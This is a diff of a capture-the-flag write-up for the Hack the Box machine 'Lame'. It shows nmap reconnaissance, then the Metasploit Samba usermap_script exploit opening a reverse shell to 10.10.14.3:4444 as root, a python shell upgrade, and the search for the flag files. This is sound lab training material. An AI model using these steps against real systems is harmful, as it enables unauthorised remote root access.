@@ -18,7 +18,7 @@ Lame is an easy level retired capture the flag machine from Hack the Box. This w
 After connecting to the hack the box network via openvpn, the first thing I did was use a basic nmap scan to search for the top 200 open ports. The scan shows 4 open ports running services including ftp, ssh, netbiod, and microsoft-ds.
 
 
-```bash
+```
 ┌──(kali㉿kali)-[~/Documents/htb/lame]
 └─$ nmap --top-ports 200 -Pn 10.10.10.3                                                    
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds
 
 Next, to get a more detailed view of the open ports and services, as well as to check the service versions for common vulnerabilities, I used the [nmap automator](https://github.com/21y4d/nmapAutomator) script. The output below is snipped to include only the most relevant information from the scan.
 
-```bash
+```
 ┌──(kali㉿kali)-[~/Documents/htb/lame]
 └─$ nmapAutomator.sh 10.10.10.3 All  
 ---------------------Starting Nmap Basic Scan---------------------
@@ -205,14 +205,14 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 The nmapAutomator scan revealed a lot of interesting information about the target, including a likely vulnerbility. Instead of using the identifed vulnerabilites, I instead opted to go after the smb service, which I noted was a vulnerable version.  
 
-```bash
+```
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 ```  
 
 After doing some quick research with searchsploit and exploit-db, I confirmed that the current smb version in use is vulnerable to a public exploit on metasploit. Below is the high level details on the multi/samba/usermap_script metasploit module.
 
-```bash
+```
 msf6 exploit(multi/samba/usermap_script) > info
 
        Name: Samba "username map script" Command Execution
@@ -264,7 +264,7 @@ msf6 exploit(multi/samba/usermap_script) >
 
 I configured the necessary options including setting the target host/port and the local host/port. Executing the exploit started a reverse shell on the target as the root user.   
 
-```bash
+```
 msf6 exploit(multi/samba/usermap_script) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.3:4444 
@@ -278,7 +278,7 @@ pwd
 
 Next, i upgraded my shell using python in order to get a more functioning shell.   
 
-```bash
+```
 msf6 exploit(multi/samba/usermap_script) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.3:4444 
@@ -297,7 +297,7 @@ root@lame:/#
 
 With a more functioning shell, I used the `find` command to search for the root.txt and user.txt flags.
 
-```bash
+```
 root@lame:/# find -name "root.txt"
 find -name "root.txt"
 ./root/root.txt
@@ -307,7 +307,7 @@ cat ./root/root.txt
 root@lame:/# 
 ```  
 
-```bash
+```
 root@lame:/# find -name "user.txt"
 find -name "user.txt"
 ./home/makis/user.txt
